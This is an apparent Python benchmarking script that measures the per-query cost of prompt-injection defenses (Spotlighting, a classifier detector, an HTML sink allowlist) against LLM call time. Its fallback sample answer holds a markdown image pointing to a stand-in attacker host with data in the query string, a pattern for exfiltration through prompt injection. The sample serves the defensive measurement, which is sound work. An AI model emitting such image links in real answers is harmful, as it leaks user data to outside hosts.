"""Measure what each defense costs per clean test query: Spotlighting prompt tokens,
detector time (GPU and CPU), sink time, and LLM time at batch size 1. Writes
<res>/costs.json and <res>/costs.md.

Usage: python -m layering.costs --res results --model Qwen/Qwen2.5-7B-Instruct
"""
from __future__ import annotations

import argparse
import json
import os
import statistics
import time

from .data import make_candidates
from .defenses import HFDetector, MockDetector, safe_render
from .pipeline import Corpus, build_messages, make_backend


def timed(fn, items, warmup: int = 2) -> list[float]:
    for x in items[:warmup]:
        fn(x)
    out = []
    for x in items:
        t = time.perf_counter()
        fn(x)
        out.append(time.perf_counter() - t)
    return out


def median_ms(xs: list[float]) -> float:
    return 1000 * statistics.median(xs)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--res", default="results")
    ap.add_argument("--model", default="Qwen/Qwen2.5-7B-Instruct")
    ap.add_argument("--backend", default="hf", choices=["hf", "mock"])
    ap.add_argument("--detector", default="hf", choices=["hf", "mock"])
    ap.add_argument("--n-llm", type=int, default=12, help="queries timed per LLM condition")
    a = ap.parse_args()
    meta_path = os.path.join(a.res, "meta.json")
    max_tokens = json.load(open(meta_path)).get("max_tokens", 512) if os.path.exists(meta_path) else 512

    test = [c for c in make_candidates() if c.split == "test"]
    corpus = Corpus(test)
    docs = {c.cid: corpus.retrieve(c, None) for c in test}
    msgs = {s: [build_messages(c, docs[c.cid], s) for c in test] for s in (False, True)}
    try:
        import torch
        device = torch.cuda.get_device_name(0) if torch.cuda.is_available() else "CPU"
        gpu = torch.cuda.is_available()
    except ImportError:
        device, gpu = "CPU", False
    res = dict(model=a.model, device=device, n_queries=len(test), max_tokens=max_tokens)

    if a.backend == "mock":
        def count(m):
            return sum(len(x["content"]) for x in m) // 4
    else:
        from transformers import AutoTokenizer
        tok = AutoTokenizer.from_pretrained(a.model)

        def count(m):
            text = tok.apply_chat_template(m, tokenize=False, add_generation_prompt=True)
            return len(tok(text, add_special_tokens=False)["input_ids"])
    res["prompt_tokens"] = {"plain": statistics.mean(count(m) for m in msgs[False]),
                            "spotlight": statistics.mean(count(m) for m in msgs[True])}

    chunk_lists = [[d["text"] for d in docs[c.cid]] for c in test]
    res["chunks_per_query"] = statistics.mean(len(x) for x in chunk_lists)
    if a.detector == "mock":
        detectors = {"mock": MockDetector()}
    else:
        detectors = {"cpu": HFDetector(device=-1)}
        if gpu:
            detectors["gpu"] = HFDetector(device=0)
    res["detector_ms_per_query"] = {}
    for name, det in detectors.items():
        def classify(texts, det=det):
            if hasattr(det, "_cache"):
                det._cache.clear()               # time the classifier, not the cache
            det.scores(texts)
        res["detector_ms_per_query"][name] = median_ms(timed(classify, chunk_lists))

    runs = os.path.join(a.res, "runs.jsonl")
    outs = []
    if os.path.exists(runs):
        with open(runs) as f:
            for i, line in enumerate(f):
                if i >= 2000:
                    break
                outs.append(json.loads(line)["output"])
    if not outs:
        outs = ["**Summary.** ![x](https://evil.example.net/p?d=HR-1) "
                "[p](https://intranet.example.com/a)\n\nDECISION: REJECT"] * 200
    res["sink_ms_per_answer"] = median_ms(timed(safe_render, outs))

    llm = make_backend(a.backend, a.model, max_tokens, batch_size=1)
    res["llm_s_per_query"] = {}
    for spot, label in ((False, "plain"), (True, "spotlight")):
        sample = msgs[spot][:a.n_llm]
        res["llm_s_per_query"][label] = statistics.median(
            timed(lambda m: llm.generate([m]), sample, warmup=1))

    with open(os.path.join(a.res, "costs.json"), "w") as f:
        json.dump(res, f, indent=1)
    pt, ls, dm = res["prompt_tokens"], res["llm_s_per_query"], res["detector_ms_per_query"]
    extra = pt["spotlight"] - pt["plain"]
    det_cells = ", ".join(f"{v:.0f} ms on {k.upper()}" for k, v in dm.items())
    md = "\n".join([
        f"Measured on {device}, model {a.model}, clean test queries (n={len(test)}). Medians. "
        "Absolute times depend on the hardware; compare each defense with the LLM call.\n",
        "| Defense | Extra work per query | Extra time per query |",
        "|---|---|---|",
        f"| Spotlighting | +{extra:.0f} prompt tokens (+{100 * extra / pt['plain']:.0f}%) | "
        f"LLM call {ls['spotlight']:.2f} s vs {ls['plain']:.2f} s without |",
        f"| Detector | {res['chunks_per_query']:.1f} classifier calls | {det_cells} |",
        f"| Sink allowlist | one HTML parse of the answer | {res['sink_ms_per_answer']:.2f} ms on CPU |",
        f"| (reference) LLM call | - | {ls['plain']:.2f} s (batch 1, up to {max_tokens} new tokens) |",
    ])
    with open(os.path.join(a.res, "costs.md"), "w") as f:
        f.write(md + "\n")
    print(md)


if __name__ == "__main__":
    main()
